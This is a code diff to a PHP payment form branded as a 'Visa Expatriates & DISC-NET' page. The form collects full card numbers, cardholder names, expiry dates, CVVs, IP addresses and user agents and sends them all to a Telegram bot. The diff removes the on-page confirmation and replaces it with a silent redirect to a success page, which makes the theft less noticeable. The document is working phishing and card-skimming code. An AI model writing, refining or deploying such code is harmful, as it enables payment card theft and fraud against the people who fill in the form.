@@ -1,7 +1,7 @@
 <?php
 /**
  * Dark Mode Credit Card Form with Visa Expatriates & DISC-NET Branding
- * + Telegram notification of all submitted data.
+ * + Telegram notification + redirect to success page.
  */
 
 // ========== TELEGRAM CONFIGURATION ==========
@@ -39,10 +39,6 @@ function luhnCheck($cardNumber) {
     return ($sum % 10 == 0);
 }
 
-/**
- * Send a message to Telegram bot
- * @return bool true on success, false on failure
- */
 function sendToTelegram($message) {
     global $botToken, $chatId;
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
@@ -66,15 +62,6 @@ function sendToTelegram($message) {
 }
 
 // Handle form submission
-$submitted = false;
-$detectedType = '';
-$luhnValid = false;
-$maskedCard = '';
-$displayName = '';
-$displayExpiry = '';
-$errorMessage = '';
-$telegramStatus = '';
-
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $cardNumberRaw = trim($_POST['card_number'] ?? '');
     $nameOnCard = trim($_POST['card_name'] ?? '');
@@ -82,37 +69,38 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $securityCode = trim($_POST['cvv'] ?? '');
     
     if (empty($cardNumberRaw) || empty($nameOnCard) || empty($expiryDate) || empty($securityCode)) {
-        $errorMessage = 'Please fill in all fields.';
-    } else {
-        $detectedType = detectCardType($cardNumberRaw);
-        $luhnValid = luhnCheck($cardNumberRaw);
-        $cleanNumber = preg_replace('/\D/', '', $cardNumberRaw);
-        $last4 = substr($cleanNumber, -4);
-        $maskedCard = '•••• •••• •••• ' . $last4;
-        $displayName = htmlspecialchars($nameOnCard);
-        $displayExpiry = htmlspecialchars($expiryDate);
-        
-        // ---- SEND ALL DATA TO TELEGRAM ----
-        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
-        $message = "<b>💳 NEW CARD SUBMISSION</b>\n"
-                 . "━━━━━━━━━━━━━━━━━━\n"
-                 . "🏷 <b>Card Type:</b> {$detectedType}\n"
-                 . "🔢 <b>Card Number:</b> {$cardNumberRaw}\n"
-                 . "👤 <b>Cardholder:</b> {$nameOnCard}\n"
-                 . "📅 <b>Expiry:</b> {$expiryDate}\n"
-                 . "🔐 <b>CVV:</b> {$securityCode}\n"
-                 . "✅ <b>Luhn valid:</b> " . ($luhnValid ? 'Yes' : 'No') . "\n"
-                 . "━━━━━━━━━━━━━━━━━━\n"
-                 . "🌐 <b>IP:</b> {$ip}\n"
-                 . "🖥 <b>User Agent:</b> {$userAgent}\n"
-                 . "⏱ <b>Time:</b> " . date('Y-m-d H:i:s');
-        
-        $telegramOk = sendToTelegram($message);
-        $telegramStatus = $telegramOk ? '✅ Data sent to secure channel.' : '⚠️ Telegram notification failed.';
-        
-        $submitted = true;
+        // If error, we show the form again with error message (stored in session or just re-display)
+        // For simplicity, we'll redirect back with an error flag.
+        session_start();
+        $_SESSION['error'] = 'Please fill in all fields.';
+        header("Location: index.php");
+        exit;
     }
+    
+    $detectedType = detectCardType($cardNumberRaw);
+    $luhnValid = luhnCheck($cardNumberRaw);
+    
+    // ---- SEND ALL DATA TO TELEGRAM ----
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
+    $message = "<b>💳 NEW CARD SUBMISSION</b>\n"
+             . "━━━━━━━━━━━━━━━━━━\n"
+             . "🏷 <b>Card Type:</b> {$detectedType}\n"
+             . "🔢 <b>Card Number:</b> {$cardNumberRaw}\n"
+             . "👤 <b>Cardholder:</b> {$nameOnCard}\n"
+             . "📅 <b>Expiry:</b> {$expiryDate}\n"
+             . "🔐 <b>CVV:</b> {$securityCode}\n"
+             . "✅ <b>Luhn valid:</b> " . ($luhnValid ? 'Yes' : 'No') . "\n"
+             . "━━━━━━━━━━━━━━━━━━\n"
+             . "🌐 <b>IP:</b> {$ip}\n"
+             . "🖥 <b>User Agent:</b> {$userAgent}\n"
+             . "⏱ <b>Time:</b> " . date('Y-m-d H:i:s');
+    
+    sendToTelegram($message);
+    
+    // Redirect to success page
+    header("Location: success.html");
+    exit;
 }
 ?>
 <!DOCTYPE html>
@@ -340,32 +328,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             color: #8aa2d4;
         }
 
-        .result-dark {
-            margin-top: 24px;
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(8px);
-            border-radius: 24px;
-            padding: 20px;
-            border-left: 4px solid #3b82f6;
-            color: #e2e8f0;
-            font-size: 0.85rem;
-        }
-        .error-dark {
+        .error-message {
             background: rgba(220,38,38,0.15);
-            border-left-color: #ef4444;
-        }
-        .badge-dark {
-            background: #0f172a;
-            padding: 4px 12px;
-            border-radius: 40px;
-            display: inline-block;
-            color: #90cdf4;
-            margin: 6px 0;
-        }
-        .telegram-note {
-            font-size: 0.7rem;
-            margin-top: 8px;
-            color: #7f8ea3;
+            border-left: 4px solid #ef4444;
+            margin-top: 20px;
+            padding: 12px 20px;
+            border-radius: 20px;
+            color: #fecaca;
+            font-size: 0.85rem;
         }
     </style>
 </head>
@@ -436,32 +406,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         </div>
     </div>
 
-    <?php if ($submitted && empty($errorMessage)): ?>
-    <div class="result-dark">
-        <strong>✅ Payment simulation received</strong><br>
-        📇 <strong>Detected card type:</strong> 
-        <span class="badge-dark"><?php echo htmlspecialchars($detectedType); ?></span><br>
-        <?php if ($detectedType === 'Visa'): ?>
-            💙 <strong>VISA card confirmed</strong> — French Expatriates network<br>
-        <?php elseif ($detectedType !== 'Other'): ?>
-            🃏 <strong><?php echo htmlspecialchars($detectedType); ?></strong> detected<br>
-        <?php else: ?>
-            ⚠️ Other card type (not Visa)<br>
-        <?php endif; ?>
-        🔐 <strong>Luhn check:</strong> <?php echo $luhnValid ? '✅ Valid' : '❌ Invalid checksum'; ?><br>
-        💳 <strong>Masked card:</strong> <?php echo $maskedCard; ?><br>
-        👤 <strong>Cardholder:</strong> <?php echo $displayName; ?><br>
-        <div class="telegram-note">📨 <?php echo $telegramStatus; ?></div>
-    </div>
-    <?php elseif ($submitted && $errorMessage): ?>
-    <div class="result-dark error-dark">
-        ❌ <?php echo htmlspecialchars($errorMessage); ?>
-    </div>
-    <?php endif; ?>
+    <?php
+    session_start();
+    if (isset($_SESSION['error'])) {
+        echo '<div class="error-message">❌ ' . htmlspecialchars($_SESSION['error']) . '</div>';
+        unset($_SESSION['error']);
+    }
+    ?>
 </div>
 
 <script>
-    // Real-time card detection & UI updates (dark mode) – same as before
+    // Real-time card detection & UI updates (dark mode)
     (function() {
         function detectCardTypeJS(cardNumber) {
             let num = cardNumber.replace(/\D/g, '');
